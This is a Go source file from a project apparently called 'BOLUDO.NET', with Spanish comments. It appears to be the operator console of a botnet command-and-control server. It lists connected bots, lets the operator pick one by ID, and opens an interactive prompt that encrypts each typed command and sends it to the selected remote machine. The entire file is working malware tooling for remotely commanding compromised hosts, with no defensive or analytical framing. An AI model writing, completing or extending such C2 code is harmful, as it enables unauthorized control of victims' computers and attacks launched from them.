package nets

import (
	"bufio"
	"fmt"
	"log"
	"os"

	"BOLUDO.NET/config"
	"BOLUDO.NET/seguridad"
	"BOLUDO.NET/util"
)

// ReplBOT establece una sesión interactiva con un bot seleccionado por ID.
func ReplBOT() {
	var (
		ID    int
		Input string
	)

	util.LimpiarConsola()
	Listar() // Asumo que Listar es una función definida en otro lugar para listar los bots.

	fmt.Print("\nIngrese el ID del BOT: ")
	fmt.Scan(&ID)

	if CheckBOT(ID) {
		util.LimpiarConsola()
		fmt.Printf("Sesión establecida: %s\n", config.BOT[ID].RemoteAddr())
		Lector := bufio.NewReader(os.Stdin)
		for {
			fmt.Printf("(%s)> ", config.BOT[ID].RemoteAddr())
			Input, _ = Lector.ReadString('\n')
			Input = Input[:len(Input)-1]
			Enviar(ID, Input)
			// Lógica adicional si es necesaria
		}
	} else {
		fmt.Println("ID de BOT no válido.")
	}
}

// Enviar envía un mensaje encriptado al bot con el ID especificado.
func Enviar(ID int, InputSend string) {
	// Encriptar el mensaje
	InputEncrypt, err := seguridad.Encryptar(InputSend)
	if err != nil {
		log.Fatalf("[!] ERROR AL ENCRYPTAR: %s", err.Error())
	}

	if CheckBOT(ID) {
		BOT := config.BOT[ID]
		_, err := BOT.Write([]byte(InputEncrypt))
		if err != nil {
			log.Fatalf("[!] ERROR AL ENVIAR (Sección Write): %s", err.Error())
		}
	} else {
		log.Printf("[!] BOT con ID %d no válido o desconectado.", ID)
	}
}
